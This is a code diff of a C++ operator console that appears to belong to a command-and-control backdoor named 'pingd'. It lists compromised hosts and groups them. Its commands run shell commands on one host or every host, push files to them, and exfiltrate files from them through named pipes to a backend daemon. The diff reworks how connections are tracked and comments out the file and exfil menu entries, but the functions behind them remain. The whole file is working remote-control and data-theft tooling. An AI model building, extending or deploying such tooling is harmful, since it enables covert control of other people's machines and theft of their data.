@@ -1,12 +1,11 @@
 #include <iostream>
 #include <map>
+#include <set>
 #include <vector>
 #include <string>
 #include <functional>
 #include <sstream>
 #include <algorithm>
-#include <thread>
-#include <mutex>
 #include <fstream>
 #include <filesystem>
 
@@ -22,12 +21,10 @@ struct command_t
   std::string desc;
 };
 
-using host_mapping_t = std::map<std::string, std::string>;
 using group_t = std::map<std::string, std::vector<std::string>>;
 
 /** Currently connected hosts */
-static host_mapping_t active_connections;
-static std::mutex active_connections_mutex;
+static std::set<std::string> active_connections;
 
 /** Groups */
 static group_t groups;
@@ -37,9 +34,6 @@ static std::string cur_host;
 
 /** Currently selected group */
 static std::string cur_group;
-
-static const std::string command_pipe = "/tmp/pingd_command";
-static const std::string host_info_pipe = "/tmp/pingd_host_info";
 
 void cmd_help(const std::string &);
 void cmd_list(const std::string &);
@@ -55,7 +49,7 @@ void cmd_exit(const std::string &);
 
 static const std::map<std::string, command_t> commands = {
   { "help", { cmd_help, "help: displays usable commands" } },
-  { "list", { cmd_list, "list: lists all active connections to the server" } },
+  { "list", { cmd_list, "list: retrieves all active connections from the server" } },
   { "group", { cmd_group,
                "group: by default this command lists all groups\n"
                "\tadd/rm [group] [host]: adds/removes a host to a group to run commands on\n"
@@ -63,40 +57,16 @@ static const std::map<std::string, command_t> commands = {
                "\tlist [group]: lists all hosts within a group" } },
   { "set", { cmd_set, "set [host/group]: sets the current host to run commands on" } },
   { "run", { cmd_run, "run [command]: runs a command on the currently set host" } },
-  { "file", { cmd_file,
-              "file [src] [dst]: sends a file to the currently set host.\n"
-              "\tsrc is the file on the server box, and dst is the location on the host machine." } },
-  { "exfil", { cmd_exfil,
-               "exfil [src] [dst]: exfiltrates a file from the currently set host.\n"
-               "\tsrc is the location on the server to save the file, and dst is the location of the file on the host to exfiltrate." } },
+  // { "file", { cmd_file,
+  //             "file [src] [dst]: sends a file to the currently set host.\n"
+  //             "\tsrc is the file on the server box, and dst is the location on the host machine." } },
+  // { "exfil", { cmd_exfil,
+  //              "exfil [src] [dst]: exfiltrates a file from the currently set host.\n"
+  //              "\tsrc is the location on the server to save the file, and dst is the location of the file on the host to exfiltrate." } },
   { "runall", { cmd_runall, "runall [command]: runs a command on all active connections" } },
   { "clear", { cmd_clear, "clear: clear the active connections. Useful for testing if connections still exist." } },
   { "exit", { cmd_exit, "exit: stops the server and exits" } },
 };
-
-void active_connections_task()
-{
-  while (1) {
-    int pipefd;
-    if ((pipefd = open(host_info_pipe.c_str(), O_RDWR)) == -1) {
-      perror("open()");
-      std::exit(-1);
-    }
-
-    uint8_t buf[1024];
-    size_t nbytes;
-    if ((nbytes = read(pipefd, buf, 1024)) == -1) {
-      perror("read()");
-    }
-
-    close(pipefd);
-
-    std::string host{ (char *)buf, nbytes };
-    std::string ip = host.substr(host.find('@') + 1, host.size());
-    std::lock_guard<std::mutex> guard(active_connections_mutex);
-    active_connections[host] = ip;
-  }
-}
 
 std::vector<std::string> split_input(const std::string &input)
 {
@@ -108,11 +78,10 @@ std::vector<std::string> split_input(const std::string &input)
   return ret;
 }
 
-std::ostream &operator<<(std::ostream &os, const host_mapping_t &mapping)
+std::ostream &operator<<(std::ostream &os, const std::set<std::string> &mapping)
 {
-  auto it = mapping.begin();
-  for (; it != mapping.end(); it++) {
-    os << it->first << ": " << it->second << "\n";
+  for (auto &host : mapping) {
+    os << host << "\n";
   }
   return os;
 }
@@ -127,8 +96,42 @@ void cmd_help(const std::string &input)
 
 void cmd_list(const std::string &)
 {
+  int in_pipefd, out_pipefd;
+  if ((in_pipefd = open("/tmp/pingd_in", O_WRONLY)) == -1) {
+    perror("open()");
+    return;
+  }
+
+  if ((out_pipefd = open("/tmp/pingd_out", O_RDONLY)) == -1) {
+    perror("open()");
+    return;
+  }
+
+  if (write(in_pipefd, "refresh", 7) == -1) {
+    perror("write()");
+  }
+
+  char in[1024];
+  size_t count;
+  size_t nbytes;
+
+  if ((nbytes = read(out_pipefd, &count, sizeof(count))) == -1) {
+    perror("read()");
+  }
+
+  while (count > 0) {
+    if ((nbytes = read(out_pipefd, in, sizeof(in))) == -1) {
+      perror("read()");
+    }
+    const std::string in_str{ in, nbytes };
+    active_connections.insert(in_str);
+    count--;
+  }
+
+  close(in_pipefd);
+  close(out_pipefd);
+
   std::puts("Listing active machines!");
-  std::lock_guard<std::mutex> guard(active_connections_mutex);
   std::cout << active_connections;
 }
 
@@ -214,7 +217,6 @@ void cmd_set(const std::string &input)
     return;
   }
 
-
   if (active_connections.find(input_arr.at(1)) != active_connections.end()) {
     cur_host = input_arr.at(1);
     cur_group.clear();
@@ -244,20 +246,19 @@ void cmd_run(const std::string &input)
   }
 
   int pipefd;
-  if ((pipefd = open(command_pipe.c_str(), O_WRONLY)) == -1) {
+  if ((pipefd = open("/tmp/pingd_in", O_WRONLY)) == -1) {
     perror("open()");
     return;
   }
 
   if (!cur_host.empty()) {
-    std::string ip = active_connections[cur_host];
     std::cout << "Running command \"" << command << "\" on "
-              << ip
+              << cur_host
               << "\n";
 
     std::stringstream sstream;
     sstream << "send_command "
-            << ip
+            << cur_host
             << " "
             << command;
 
@@ -271,14 +272,13 @@ void cmd_run(const std::string &input)
       if (active_connections.find(host) == active_connections.end()) {
         continue;
       }
-      std::string ip = active_connections[host];
       std::cout << "Running command \"" << command << "\" on "
-                << ip
+                << host
                 << "\n";
 
       std::stringstream sstream;
       sstream << "send_command "
-              << ip
+              << host
               << " "
               << command;
 
@@ -303,22 +303,21 @@ void cmd_file(const std::string &input)
   }
 
   int pipefd;
-  if ((pipefd = open(command_pipe.c_str(), O_WRONLY)) == -1) {
+  if ((pipefd = open("/tmp/pingd_in", O_WRONLY)) == -1) {
     perror("open()");
     return;
   }
 
   if (!cur_host.empty()) {
-    std::string ip = active_connections[cur_host];
     std::cout << "Sending file: " << input_arr.at(1) << " to: " << input_arr.at(2) << " on: "
-              << ip
+              << cur_host
               << "\n";
 
     std::filesystem::path p = input_arr.at(1);
 
     std::stringstream sstream;
     sstream << "send_file "
-            << ip
+            << cur_host
             << " "
             << std::filesystem::absolute(p)
             << " "
@@ -334,16 +333,15 @@ void cmd_file(const std::string &input)
       if (active_connections.find(host) == active_connections.end()) {
         continue;
       }
-      std::string ip = active_connections[host];
       std::cout << "Sending file: " << input_arr.at(1) << " to: " << input_arr.at(2) << " on: "
-                << ip
+                << host
                 << "\n";
 
       std::filesystem::path p = input_arr.at(1);
 
       std::stringstream sstream;
       sstream << "send_file "
-              << ip
+              << host
               << " "
               << std::filesystem::absolute(p)
               << " "
@@ -375,22 +373,20 @@ void cmd_exfil(const std::string &input)
   }
 
   int pipefd;
-  if ((pipefd = open(command_pipe.c_str(), O_WRONLY)) == -1) {
+  if ((pipefd = open("/tmp/pingd_in", O_WRONLY)) == -1) {
     perror("open()");
     return;
   }
 
-  std::string ip = active_connections[cur_host];
-
   std::cout << "Receiving file: " << input_arr.at(1) << " to: " << input_arr.at(2) << " on: "
-            << ip
+            << cur_host
             << "\n";
 
   std::filesystem::path p = input_arr.at(2);
 
   std::stringstream sstream;
   sstream << "recv_file "
-          << ip
+          << cur_host
           << " "
           << input_arr.at(1)
           << " "
@@ -414,7 +410,7 @@ void cmd_runall(const std::string &input)
   }
 
   int pipefd;
-  if ((pipefd = open(command_pipe.c_str(), O_WRONLY)) == -1) {
+  if ((pipefd = open("/tmp/pingd_in", O_WRONLY)) == -1) {
     perror("open()");
     return;
   }
@@ -427,12 +423,10 @@ void cmd_runall(const std::string &input)
     }
   }
 
-  std::lock_guard<std::mutex> guard(active_connections_mutex);
-  auto it = active_connections.begin();
-  for (; it != active_connections.end(); it++) {
+  for (auto &host : active_connections) {
     std::stringstream sstream;
     sstream << "send_command "
-            << it->second
+            << host
             << " "
             << command;
 
@@ -447,7 +441,6 @@ void cmd_runall(const std::string &input)
 void cmd_clear(const std::string &)
 {
   std::puts("Clearing active connections");
-  std::lock_guard<std::mutex> guard(active_connections_mutex);
   active_connections.clear();
 }
 
@@ -473,10 +466,9 @@ char *command_generator(const char *text, int state)
       }
     }
 
-    for (auto it = active_connections.begin(); it != active_connections.end(); it++) {
-      auto &word = it->first;
-      if (word.size() >= textstr.size() && word.compare(0, textstr.size(), textstr) == 0) {
-        matches.push_back(word);
+    for (auto &host : active_connections) {
+      if (host.size() >= textstr.size() && host.compare(0, textstr.size(), textstr) == 0) {
+        matches.push_back(host);
       }
     }
 
@@ -502,9 +494,6 @@ char **command_completion(const char *text, int start, int end)
 
 int main(int argc, char **argv)
 {
-  std::thread active_connections_thread(active_connections_task);
-  active_connections_thread.detach();
-
   cmd_help("help");
 
   rl_attempted_completion_function = command_completion;
